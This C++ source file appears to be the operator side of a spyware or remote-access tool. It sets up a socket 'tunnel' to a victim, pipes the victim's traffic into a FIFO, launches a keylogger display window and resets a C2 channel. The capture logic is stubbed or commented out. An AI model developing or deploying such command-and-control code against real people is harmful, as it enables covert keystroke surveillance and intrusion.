#include "spy_tunnel.hpp"

int SpyTunnel::init(std::string __ip, uint __port, int* p_tunnel_shutdown_fd, int __connection_type) {
    ip_ = __ip;
    port_ = __port;
    memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
    tunnel_addr_.sin_family = AF_INET;
    tunnel_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_.c_str(), &tunnel_addr_.sin_addr) <= 0) {
        return -1;
    }
    tunnel_socket_ = socket(AF_INET, __connection_type, 0);

    p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;

    return 0;
}

// Child process spawning the window
// Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
void SpyTunnel::run() {
    pid_t pid = fork();
    if (pid == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
        return;
    } else if (pid == 0) {
        spawn_window();
        _exit(EXIT_FAILURE);
    }

    int tries = 0;
    while ((tunnel_fifo_ = open(KEYLOGGER_FIFO_PATH, O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
        return;
    }

    const char* test = "test\n";
    for (int i=0; i<5; i++) {
        write(tunnel_fifo_, test, strlen(test));
        std::this_thread::sleep_for(std::chrono::milliseconds(300));
    }

    return;
    /*
    ScopedEpollFD epoll_fd;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error creating epoll instance" << RESET;
        return;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &shutdown_event) == -1) {
        return;
    }
    */
}

void SpyTunnel::shutdown() {
    if (tunnel_fifo_ != -1) {
        write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
        close(tunnel_fifo_);
    }
    if (tunnel_socket_ != -1) {
        close(tunnel_socket_);
    }
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
}

Tunnel::Tunnel(CommandCode __command_code, int __client_index, SpyTunnel* __p_spy_tunnel) {
    command_code_ = __command_code;
    client_index_ = __client_index;
    p_spy_tunnel_ = __p_spy_tunnel;
    tunnel_shutdown_fd_ = -1;
}

void erase_tunnel(std::vector<Tunnel>* __p_tunnels, int __client_index, CommandCode __command_code) {
    auto it = std::remove_if(
        __p_tunnels->begin(), 
        __p_tunnels->end(),
        [=](Tunnel& tunnel) {
            bool should_erase = (tunnel.client_index_ == __client_index && tunnel.command_code_ == __command_code); 
            if (should_erase) {
                delete tunnel.p_spy_tunnel_;
            }
            return should_erase;
        }
    );

    __p_tunnels->erase(it, __p_tunnels->end());
}

void SpyTunnel::spawn_window() {
    // Overridden
}